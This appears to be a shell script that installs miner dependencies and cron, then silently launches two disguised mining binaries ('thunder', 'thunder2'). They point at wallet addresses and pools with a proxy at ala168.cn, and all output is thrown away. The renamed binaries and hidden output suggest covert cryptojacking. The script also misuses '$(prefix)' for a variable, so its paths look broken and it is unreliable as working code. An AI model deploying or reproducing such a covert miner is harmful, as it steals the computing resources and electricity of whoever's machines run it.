export prefix=./remoteM 
apt update -y
sudo apt install libuv1 libuv1-dev -y
sudo apt install libhwloc-dev hwloc  -y
sudo ln -s /usr/lib/libhwloc.so.10 /usr/lib/libhwloc.so.15
sudo ldconfig
apt install cron -y
apt install nano -y
service cron start
id1=87CdGvxKktVNebisEHVzNwCjPeS54wrPkBAMuGViHNDMjWBU4hwoubRLagcxFEUo2K5kcJ4QSVanEPag9UDr4s9bQSYQ4hz
id2=125fka2fSVTvhv6dSTzMWQNN3ZBLWZNQLneH8BKqLH8aYUANvVFtLWL7457cQnCfMvXuSizBaH5k5b6DnmupCiPdjjG
port=64520
pool1=ala168.cn:431
pool2=ala168.cn:6452
proxy=ala168.cn:64520
sudo apt install nvidia-opencl-dev  -y
chmod u+x $(prefix)/thunder
chmod u+x $(prefix)/thunder2
chmod u+x $(prefix)/qd.sh
chmod u+x $(prefix)/reset.sh
sed "s/hostname/$(hostname)/g" $(prefix)/test.json > $(prefix)/config.json
nohup $(prefix)/thunder --config=$(prefix)/config.json > /dev/null 2>&1 &
nohup $(prefix)/thunder2 --algorithm sha3x --pool $pool2 --wallet $id2.$(hostname) --tls true --proxy $proxy > /dev/null 2>&1 & 
